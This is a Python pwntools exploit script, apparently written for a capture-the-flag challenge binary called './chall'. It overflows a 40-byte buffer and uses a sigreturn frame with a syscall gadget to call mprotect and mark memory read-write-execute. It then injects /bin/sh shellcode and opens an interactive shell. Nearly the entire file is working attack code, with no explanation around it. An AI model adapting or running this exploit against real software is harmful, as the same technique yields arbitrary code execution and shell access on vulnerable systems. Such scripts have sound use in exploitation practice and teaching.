from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'
offset = b"a"*40
io = start()

rop = ROP(elf)

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
vuln_function  = elf.sym.echo
syscall_gadget = rop.find_gadget(['syscall','ret'])[0]
print(f"Syscall: {hex(syscall_gadget)}")
writeable = 0x0000000000400000

s = SigreturnFrame(kernel='amd64') # create sigreturn frame that calls mprotect syscall
s.rax = 10 # mprotect
s.rdi = writeable # memory address to change permissions for
s.rsi = 0x4000 # size of chunk to change permission
s.rdx = 7 # permission to set (rwx)
s.rsp = 0x00000000004010d8 # return addr (pointer to vuln funct)
s.rip = syscall_gadget # syscall gadget


payload = offset + p64(vuln_function) + p64(syscall_gadget) + bytes(s)
io.send(payload)
io.recv()
io.sendline("B"*14) # ret rax to 15 bc rax holds len of input
io.recv()
io.send(shellcode + b"\x90"*(40-len(shellcode)) + p64(0x000000004010b0)) # shellcode

io.interactive()